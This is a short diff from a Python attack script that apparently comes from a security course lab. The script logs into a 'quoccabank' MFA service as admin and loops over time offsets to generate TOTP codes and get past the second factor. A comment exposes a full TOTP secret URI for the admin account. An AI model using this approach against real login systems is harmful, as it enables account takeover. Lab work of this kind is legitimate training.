@@ -25,8 +25,8 @@ login_res = s.post("https://mfa-v2.quoccabank.com/login", {"username": "admin", 
 print("\ntrying to verify MFA now...\n")
 #admin link: otpauth://totp/mfa-v2:admin?secret=GBYHMZDVMVRVIV3YJ44G66LNPFRXG6LC
 
-for hour in range(-24,24):
-    for minute in range(-60, 60):
+for hour in range(0,24):
+    for minute in range(-5, 60):
         time.sleep(0.2)
         CurrentTime = time.mktime((time.localtime().tm_year,
                                 time.localtime().tm_mon,
